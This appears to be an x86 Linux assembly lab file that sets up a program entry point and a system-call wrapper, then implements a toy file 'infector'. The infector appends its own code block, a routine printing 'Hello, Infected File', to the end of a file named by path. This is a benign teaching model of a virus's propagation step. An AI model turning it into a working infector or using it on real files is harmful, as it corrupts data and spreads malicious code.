section .text
global _start
global system_call
global code_start
global code_end
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc
    
    call    main        ; int main( int argc, char *argv[], char *envp[] )
    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
section .rodata
out_string: db "Hello, Infected File", 10, 0
section .text
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state
      
    mov eax, dword 4 ; sys_write = 4
    mov ebx, dword 1 ; stdout = 1
    mov ecx, dword out_string
    mov edx, dword 22
    int 0x80
    
    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret
    
code_end:

infector:
    
    push    ebp             ; Save caller state
    mov     ebp, esp
    ;sub	    esp, dword 4
    pushad                  ; Save some more caller state
    
    ;; open file
    mov eax, dword 5 ; sys_open = 5
    mov ebx, dword [ebp+8] ; path arg
    mov ecx, dword 1026 ; o_append = 1024
    mov edx, dword 0777 ; mode
    int 0x80
    
    ;; append (write to) file
    ; file descriptor is returned to eax by the last syscall
    push dword eax ; push fd to the stack
    mov ebx, eax
    mov eax, dword 4 	; sys_write = 4
    mov ecx, dword code_start ; starting address
    mov edx, dword code_end   ; data length
    sub edx, ecx
    int 0x80
    
    ;; close file
    mov eax, dword 6 ; sys_close = 6
    pop ebx ; pop fd feom the stack
    int 0x80
    
    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret
    